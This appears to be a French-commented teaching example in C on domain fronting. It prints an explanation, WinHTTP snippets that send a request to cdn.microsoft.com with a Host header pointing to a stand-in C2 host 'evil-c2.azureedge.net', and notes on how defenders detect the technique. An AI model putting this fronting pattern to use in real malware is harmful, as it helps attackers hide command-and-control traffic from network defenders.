/*
 * OBJECTIF  : Comprendre le Domain Fronting pour masquer le trafic C2
 * PREREQUIS : HTTPS, CDN, DNS
 * COMPILE   : cl example.c /Fe:example.exe /link winhttp.lib
 *
 * Le Domain Fronting utilise les CDN pour masquer la destination reelle.
 * Le SNI (visible) pointe vers un domaine legitime, mais le Host header
 * (chiffre dans TLS) pointe vers le serveur C2.
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

void demo_concept(void) {
    printf("[1] Domain Fronting - Concept\n\n");
    printf("    SNI (visible)     : cdn.microsoft.com\n");
    printf("    Host (chiffre)    : evil-c2.azureedge.net\n\n");
    printf("    Le firewall/proxy voit une connexion vers cdn.microsoft.com\n");
    printf("    Le CDN route le trafic vers evil-c2.azureedge.net\n\n");
    printf("    Code WinHTTP :\n");
    printf("    WinHttpConnect(hSession, L\"cdn.microsoft.com\", 443, 0);\n");
    printf("    WinHttpOpenRequest(hConnect, L\"GET\", L\"/\", ...);\n");
    printf("    WinHttpAddRequestHeaders(hReq,\n");
    printf("        L\"Host: evil-c2.azureedge.net\", -1, WINHTTP_ADDREQ_FLAG_REPLACE);\n\n");
}

void demo_detection(void) {
    printf("[2] Detection et etat actuel\n\n");
    printf("    CDN ayant bloque le Domain Fronting :\n");
    printf("    - Amazon CloudFront (2018)\n");
    printf("    - Google Cloud (2018)\n");
    printf("    - Azure CDN (partiellement)\n\n");
    printf("    Detection :\n");
    printf("    - Comparer SNI et Host header (proxy TLS)\n");
    printf("    - Verifier la coherence domaine/CDN\n\n");
}

int main(void) {
    printf("[*] Demo : Domain Fronting\n");
    printf("[*] ==========================================\n\n");
    demo_concept();
    demo_detection();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
